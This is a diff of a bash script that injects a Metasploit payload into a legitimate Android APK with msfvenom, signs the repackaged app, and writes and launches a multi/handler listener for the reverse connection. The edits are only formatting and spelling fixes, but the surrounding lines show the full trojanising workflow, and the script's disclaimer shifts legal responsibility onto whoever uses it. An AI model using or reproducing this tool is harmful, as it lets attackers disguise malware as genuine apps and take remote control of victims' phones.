@@ -114,12 +114,13 @@ function Msfconsole {
                                         else
                                                 touch $TMP_DIR/.embed/handler.rc
                                         fi
-                                echo "use multi/handler" >> $TMP_DIR/.embed/handler.rc
-                                echo "set PAYLOAD $PAYLOAD" >> $TMP_DIR/.embed/handler.rc
-                                echo "set LHOST $LHOST" >> $TMP_DIR/.embed/handler.rc                                                         echo "set LPORT $LPORT" >> $TMP_DIR/.embed/handler.rc
-                                echo "run" >> $TMP_DIR/.embed/handler.rc
-                                echo "
-                                \n"
+					echo "use multi/handler" >> $TMP_DIR/.embed/handler.rc
+					echo "set PAYLOAD $PAYLOAD" >> $TMP_DIR/.embed/handler.rc
+					echo "set LHOST $LHOST" >> $TMP_DIR/.embed/handler.rc
+					echo "set LPORT $LPORT" >> $TMP_DIR/.embed/handler.rc
+					echo "run" >> $TMP_DIR/.embed/handler.rc
+					echo "
+					"
                                         msfconsole -q -r $TMP_DIR/.embed/handler.rc
 }
 
@@ -149,7 +150,7 @@ printf "$R"
         echo "          [---] DISCLAIMER [---]"
 printf "$W"
         echo " This script will embed a Metasploit payload"
-        echo "         in an original .Apk file
+        echo "         in an legitim .Apk file
         "
         echo " If the law is violated with it's use,"
         echo "  This would be the responsibility of "
@@ -166,7 +167,7 @@ printf "$R       [-] Use At Your Own Risk [-]"
         "
 Banner
 printf "$C [IbyC]$W Creating payload . . .
-/n"
+"
 	msfvenom -x $APK -p $PAYLOAD LHOST=$LHOST LPORT=$LPORT
 		
 printf "$C [IbyC]$W Signing the .Apk . . ."
@@ -195,7 +196,7 @@ printf "$C [IbyC]$W Do you wanna start msfconsole handler?
 done
                 if [ $yesorno = 'y' -o $yesorno = 'Y' ] ; then
                         Chao_chao
-			printf "$C [IbyC]$W Do you wanna use the previous configurcion ?
+			printf "$C [IbyC]$W Do you wanna use the previous configuration ?
 			\n"
 			while read -p " (y|Y/n|N) >> " yesorno && [ -z $yesorno ]; do
 				printf "\n $R
